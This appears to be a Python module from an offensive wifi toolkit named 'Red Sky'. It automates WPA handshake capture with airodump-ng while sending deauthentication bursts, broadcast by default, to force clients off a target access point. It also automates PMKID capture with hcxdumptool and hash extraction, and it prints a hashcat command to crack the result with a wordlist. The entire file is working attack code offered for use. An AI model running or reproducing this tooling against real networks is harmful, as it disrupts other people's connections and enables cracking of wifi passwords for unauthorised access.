# language: Python, file: Program/wifi/handshake.py, target: Red Sky wifi — handshake + PMKID
# Two capture techniques:
#   1. Classic — airodump-ng on the target channel + aireplay-ng deauth to force a handshake
#   2. PMKID    — hcxdumptool captures the PMKID from a single EAPOL frame, no client needed

import json
import os
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


WIFI_DIR = OUTPUT_DIR / "wifi"


def _is_root() -> bool:
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False


def cmd_capture(iface: str, bssid: str, channel: str, duration: int = 60,
                deauth: bool = True, client: str = "") -> int:
    if not _is_root():
        print_err("capture needs root")
        return 1
    if not shutil.which("airodump-ng") or not shutil.which("aireplay-ng"):
        print_err("airodump-ng or aireplay-ng missing")
        return 1

    WIFI_DIR.mkdir(parents=True, exist_ok=True)
    prefix = WIFI_DIR / f"hs_{bssid.replace(':', '')}_{int(time.time())}"

    print_info(f"capturing handshake")
    print_kv("iface", iface)
    print_kv("bssid", bssid)
    print_kv("channel", channel)
    print_kv("duration", f"{duration}s")
    print_kv("deauth", deauth)
    print_kv("prefix", prefix)
    print()

    dump_cmd = ["airodump-ng", "-c", str(channel), "--bssid", bssid,
                "-w", str(prefix), iface]
    dump = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)

    deauth_procs = []
    if deauth:
        target = client if client else "FF:FF:FF:FF:FF:FF"
        print(f"  {ARTERY}▓{RESET} sending deauth bursts to {target}")
        # 3 bursts spaced out
        for _ in range(3):
            p = subprocess.Popen(["aireplay-ng", "--deauth", "5",
                                  "-a", bssid, "-c", target, iface],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            deauth_procs.append(p)
            time.sleep(5)

    for i in range(duration):
        time.sleep(1)
        if (i + 1) % 10 == 0:
            print(f"  {ARTERY}▓{RESET} capturing... {i + 1}s")

    dump.terminate()
    try:
        dump.wait(timeout=5)
    except subprocess.TimeoutExpired:
        dump.kill()
    for p in deauth_procs:
        if p.poll() is None:
            p.terminate()

    cap_file = Path(str(prefix) + "-01.cap")
    if not cap_file.exists():
        print_err("no capture file produced")
        return 1

    print()
    print_ok(f"capture written: {cap_file}")

    # verify with aircrack-ng
    if shutil.which("aircrack-ng"):
        r = subprocess.run(["aircrack-ng", str(cap_file)],
                           capture_output=True, text=True, timeout=30)
        if "1 handshake" in r.stdout or "WPA" in r.stdout:
            for line in r.stdout.splitlines():
                if "handshake" in line.lower() or "WPA" in line:
                    print(f"  {ARTERY}▓{RESET} {BONE}{line.strip()}{RESET}")
    return 0


def cmd_pmkid(iface: str, duration: int = 60) -> int:
    if not _is_root():
        print_err("pmkid needs root")
        return 1
    if not shutil.which("hcxdumptool") or not shutil.which("hcxpcapngtool"):
        print_err("install hcxdumptool and hcxtools first")
        print_info("sudo apt install hcxdumptool hcxtools")
        return 1

    WIFI_DIR.mkdir(parents=True, exist_ok=True)
    pcapng = WIFI_DIR / f"pmkid_{int(time.time())}.pcapng"
    hash_file = WIFI_DIR / f"pmkid_{int(time.time())}.22000"

    print_info(f"capturing PMKID on {iface} for {duration}s")
    print_kv("pcapng", pcapng)

    # hcxdumptool: use the interface directly (does its own channel hopping)
    cmd = ["hcxdumptool", "-i", iface, "-o", str(pcapng),
           "--active_beacon", "--enable_status=15"]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        print_err(f"hcxdumptool failed: {e}")
        return 1

    try:
        proc.wait(timeout=duration)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

    if not pcapng.exists():
        print_err("no pcapng produced")
        return 1

    print()
    print_info("extracting hashes with hcxpcapngtool")
    r = subprocess.run(["hcxpcapngtool", "-o", str(hash_file), str(pcapng)],
                       capture_output=True, text=True, timeout=120)
    for line in (r.stdout + r.stderr).splitlines():
        low = line.lower()
        if "pmkid" in low or "eapol" in low or "written" in low:
            print(f"  {ARTERY}▓{RESET} {ASH}{line.strip()}{RESET}")

    if hash_file.exists() and hash_file.stat().st_size > 0:
        print()
        print_ok(f"hash file: {hash_file} ({hash_file.stat().st_size} bytes)")
        print_info("crack with:")
        print(f"  {ASH}hashcat -m 22000 {hash_file} /usr/share/wordlists/rockyou.txt{RESET}")
    else:
        print_warn("no PMKID / handshake captured this run")
    return 0


def run_cli(args):
    if not args:
        print_err("usage: redsky wifi handshake <capture|pmkid> <iface> [options]")
        print_err("  capture <iface> --bssid AA:BB:.. --channel N [--duration S] [--no-deauth] [--client MAC]")
        print_err("  pmkid <iface> [--duration S]")
        return 2
    sub = args[0].lower()
    if len(args) < 2:
        print_err(f"{sub} needs an interface")
        return 2
    iface = args[1]

    def opt(name, default=None):
        if name in args:
            i = args.index(name)
            if i + 1 < len(args):
                return args[i + 1]
        return default

    if sub == "capture":
        bssid = opt("--bssid")
        channel = opt("--channel")
        if not bssid or not channel:
            print_err("capture needs --bssid and --channel")
            return 2
        dur = int(opt("--duration", "60"))
        deauth = "--no-deauth" not in args
        client = opt("--client", "")
        return cmd_capture(iface, bssid, channel, dur, deauth, client)

    if sub == "pmkid":
        dur = int(opt("--duration", "60"))
        return cmd_pmkid(iface, dur)

    print_err(f"unknown handshake sub-command: {sub}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
